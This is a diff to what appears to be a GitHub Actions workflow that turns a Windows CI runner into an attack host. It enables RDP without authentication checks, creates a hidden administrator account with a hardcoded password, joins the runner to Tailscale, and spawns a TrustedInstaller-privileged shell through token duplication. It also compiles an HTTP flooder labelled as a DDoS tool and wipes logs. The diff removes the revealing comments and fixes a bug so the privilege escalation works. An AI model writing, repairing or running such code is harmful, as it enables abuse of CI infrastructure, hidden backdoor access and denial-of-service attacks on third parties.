@@ -9,14 +9,12 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      # ─── STEP 1: ENABLE RDP ────────────────────────────────────────
       - name: Enable Remote Desktop & Firewall
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
 
-      # ─── STEP 2: CREATE HIDDEN ADMIN ACCOUNT ──────────────────────
       - name: Create Hidden Admin Account
         run: |
           $secpass = ConvertTo-SecureString "Hex0#2026" -AsPlainText -Force
@@ -25,7 +23,6 @@ jobs:
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0" -ErrorAction SilentlyContinue
           reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
 
-      # ─── STEP 3: INSTALL TAILSCALE & EXFIL IP ─────────────────────
       - name: Install Tailscale & Get IP
         env:
           TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
@@ -45,22 +42,20 @@ jobs:
           }
           Remove-Item "C:\tailscale.msi" -Force -ErrorAction SilentlyContinue
 
-      # ─── STEP 4: SPAWN TRUSTEDINSTALLER SHELL (FIXED) ─────────────
       - name: Spawn TrustedInstaller Shell
         run: |
           # Ensure TrustedInstaller service is running
           Start-Service TrustedInstaller -ErrorAction SilentlyContinue
           Start-Sleep -Seconds 3
 
-          # Get PID of TrustedInstaller using PowerShell (no C# Process dependency)
+          # Get PID of TrustedInstaller – use a variable that is NOT reserved
           $proc = Get-Process -Name TrustedInstaller -ErrorAction SilentlyContinue
           if (-not $proc) {
             Write-Host "TrustedInstaller service not running after start attempt."
             exit 1
           }
-          $pid = $proc[0].Id
+          $tiPid = $proc[0].Id   # <-- FIXED: renamed from $pid
 
-          # C# code – uses PID passed as parameter, no System.Diagnostics.Process
           Add-Type -TypeDefinition @"
           using System;
           using System.Runtime.InteropServices;
@@ -113,7 +108,6 @@ jobs:
                   PROCESS_INFORMATION pi;
                   uint flags = 0x08000000; // CREATE_NO_WINDOW
 
-                  // Spawn cmd.exe with /k so it stays alive – writes proof file
                   string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TI ACTIVE >> C:\\ti_proof.txt & cmd.exe /k";
                   bool success = CreateProcessAsUser(
                       hDupToken,
@@ -135,11 +129,10 @@ jobs:
               [System.Runtime.InteropServices.Marshal].Assembly.Location
           )
 
-          # Call with the PID we obtained
-          [TI]::Spawn($pid)
+          # Call with the PID we obtained (using $tiPid, not $pid)
+          [TI]::Spawn($tiPid)
           Write-Host "TrustedInstaller shell spawned. Check C:\ti_proof.txt"
 
-      # ─── STEP 5: PRE‑STAGE DDoS TOOL ──────────────────────────────
       - name: Pre‑stage DDoS HTTP Flooder
         run: |
           @"
@@ -178,10 +171,8 @@ jobs:
           }
           "@ | Out-File -FilePath "C:\Windows\Temp\flooder.cs" -Encoding ASCII
 
-          # Compile with .NET Framework 4.x compiler
           & "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:"C:\Windows\Temp\flooder.exe" "C:\Windows\Temp\flooder.cs"
 
-      # ─── STEP 6: KEEP ALIVE & WIPE LOGS (6 HOURS) ─────────────────
       - name: Keep Alive & Cleanup
         run: |
           for ($i = 1; $i -le 360; $i++) {
